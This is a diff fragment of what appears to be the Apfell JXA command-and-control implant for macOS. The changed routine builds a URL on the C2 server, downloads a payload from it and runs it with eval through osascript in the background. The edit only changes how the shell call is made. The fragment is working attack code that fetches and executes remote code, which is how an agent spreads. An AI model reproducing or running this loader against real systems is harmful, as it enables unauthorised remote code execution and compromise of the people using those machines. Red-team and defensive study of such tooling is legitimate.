@@ -486,13 +486,12 @@ sleepWakeUp = function(t){
 			        if(split_params[1] == "oneliner"){
 			            if(split_params[2] == "apfell-jxa"){
 			                full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
-                            path = "/bin/bash"
-                            args = ['-c', '/usr/bin/osascript', '-l','JavaScript','-e']
+                            path = "/usr/bin/osascript";
+                            args = ['-l','JavaScript','-e'];
                             command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
-                            command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));"
+                            command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));";
                             args.push(command);
                             args.push("&");
-                            console.log(args);
                             shell_api(path, args);
                             output = "command executed";
 			            }
